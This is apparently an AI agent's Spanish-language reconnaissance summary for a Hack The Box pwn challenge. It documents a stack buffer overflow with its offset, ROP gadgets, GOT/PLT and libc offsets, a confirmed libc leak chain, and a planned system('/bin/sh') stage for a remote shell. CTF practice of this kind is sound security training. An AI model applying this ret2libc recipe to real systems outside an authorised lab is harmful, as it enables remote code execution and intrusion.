@@ -1,0 +1,170 @@
+═══════════════════════════════════════════════════════════════════
+    RECONOCIMIENTO COMPLETO - RESTAURANT CTF (HACK THE BOX)
+═══════════════════════════════════════════════════════════════════
+
+TARGET: 94.237.48.12:40939
+CATEGORIA: Pwn
+DIFICULTAD: Easy
+
+═══════════════════════════════════════════════════════════════════
+VULNERABILIDAD PRINCIPAL
+═══════════════════════════════════════════════════════════════════
+
+TIPO: Buffer Overflow
+SEVERIDAD: CRÍTICA
+FUNCIÓN: fill() en 0x400e4a
+
+DETALLES:
+- Buffer local: 32 bytes
+- Bytes leídos: 1024 bytes
+- Overflow: 992 bytes
+- Control de RIP: ✓ Confirmado
+- Offset: 40 bytes
+
+═══════════════════════════════════════════════════════════════════
+PROTECCIONES DEL BINARIO
+═══════════════════════════════════════════════════════════════════
+
+✗ Stack Canary: DESACTIVADO (vulnerable a overflow)
+✗ PIE: DESACTIVADO (direcciones fijas)
+✓ NX: ACTIVADO (requiere ROP)
+✓ Full RELRO: ACTIVADO (GOT protegido)
+
+═══════════════════════════════════════════════════════════════════
+GADGETS ROP DISPONIBLES
+═══════════════════════════════════════════════════════════════════
+
+pop rdi; ret:          0x4010a3
+pop rsi; pop r15; ret: 0x4010a1
+ret:                   0x400eec
+
+═══════════════════════════════════════════════════════════════════
+DIRECCIONES CLAVE (NO PIE)
+═══════════════════════════════════════════════════════════════════
+
+FUNCIONES:
+main:     0x400f68
+fill:     0x400e4a
+drink:    0x400eed
+
+PLT:
+puts:     0x400650
+printf:   0x400670
+read:     0x400690
+
+GOT:
+puts:     0x601fa8
+printf:   0x601fb8
+read:     0x601fc8
+
+═══════════════════════════════════════════════════════════════════
+LIBC INFORMATION
+═══════════════════════════════════════════════════════════════════
+
+Versión: GLIBC 2.27 (Ubuntu)
+
+OFFSETS EN LIBC:
+puts:     0x080aa0
+system:   0x04f550
+execve:   0x0e4c00
+/bin/sh:  0x1b3e1a
+
+═══════════════════════════════════════════════════════════════════
+LEAK DE LIBC - PROBADO Y FUNCIONAL
+═══════════════════════════════════════════════════════════════════
+
+TÉCNICA: ROP chain para puts(puts@GOT)
+RESULTADO: ✓ EXITOSO
+
+Ejemplo de leak obtenido: 0x7fd9f6e2caa0
+
+PAYLOAD:
+  40 bytes padding
+  + pop_rdi (0x4010a3)
+  + puts@GOT (0x601fa8)
+  + puts@PLT (0x400650)
+  + main (0x400f68)
+
+EXTRACCIÓN:
+  - Leak aparece después de "Enjoy your ..."
+  - Formato: 6 bytes little endian terminando en \x7f
+  - Retorno a main confirmado para segunda etapa
+
+═══════════════════════════════════════════════════════════════════
+RUTA DE EXPLOTACIÓN
+═══════════════════════════════════════════════════════════════════
+
+ETAPA 1 - LEAK DE LIBC:
+  1. Conectar a 94.237.48.12:40939
+  2. Seleccionar opción 1 (Fill my dish)
+  3. Enviar ROP chain de leak
+  4. Extraer dirección de puts
+  5. Calcular: libc_base = leaked_puts - 0x80aa0
+
+ETAPA 2 - EXPLOTACIÓN (PENDIENTE):
+  1. Servidor vuelve a main automáticamente
+  2. Calcular: system = libc_base + 0x4f550
+  3. Calcular: /bin/sh = libc_base + 0x1b3e1a
+  4. Enviar ROP chain: system("/bin/sh")
+  5. Obtener shell remota
+  6. Capturar flag
+
+═══════════════════════════════════════════════════════════════════
+CAPACIDADES CONFIRMADAS
+═══════════════════════════════════════════════════════════════════
+
+✓ Control total de RIP
+✓ Leak de direcciones de libc funcional
+✓ Ejecución de ROP chains
+✓ Retorno a main para multi-stage exploit
+✓ Gadgets ROP suficientes disponibles
+✓ system() y /bin/sh disponibles en libc
+✓ Buffer suficientemente grande (1024 bytes) para ROP complejo
+✓ Timeout generoso (127 segundos)
+✓ Servidor estable y reproducible
+
+═══════════════════════════════════════════════════════════════════
+ARCHIVOS DE INTERÉS
+═══════════════════════════════════════════════════════════════════
+
+/workspace/restaurant_ctf/
+├── RECONOCIMIENTO_COMPLETO.md    (Documentación detallada)
+├── RESUMEN_EJECUTIVO.txt         (Este archivo)
+├── pwn_restaurant/
+│   ├── restaurant                (Binario vulnerable)
+│   └── libc.so.6                 (GLIBC 2.27)
+└── restaurant_disasm.txt         (Desensamblado completo)
+
+═══════════════════════════════════════════════════════════════════
+CONCLUSIÓN
+═══════════════════════════════════════════════════════════════════
+
+El reconocimiento está COMPLETO y ha identificado una vulnerabilidad
+CRÍTICA de buffer overflow completamente explotable.
+
+EXPLOTABILIDAD: ALTA
+IMPACTO: CRÍTICO (Remote Code Execution)
+COMPLEJIDAD: MEDIA (Requiere 2 etapas pero ambas viables)
+
+El sistema es vulnerable a:
+  - Buffer overflow sin protección
+  - Leak de direcciones de memoria
+  - Ejecución arbitraria de código (RCE)
+  - Obtención de shell interactiva
+
+═══════════════════════════════════════════════════════════════════
+PRÓXIMOS PASOS (FASE DE EXPLOTACIÓN)
+═══════════════════════════════════════════════════════════════════
+
+1. Desarrollar script de exploit automatizado
+2. Implementar cálculo dinámico de libc base
+3. Construir ROP chain para system("/bin/sh")
+4. Validar exploit localmente
+5. Ejecutar contra servidor remoto
+6. Obtener shell y capturar flag
+
+═══════════════════════════════════════════════════════════════════
+
+Reconocimiento completado por: Claude (Cursor AI Agent)
+Fecha: 2025-10-19
+Estado: ✓ COMPLETO - LISTO PARA FASE DE EXPLOTACIÓN
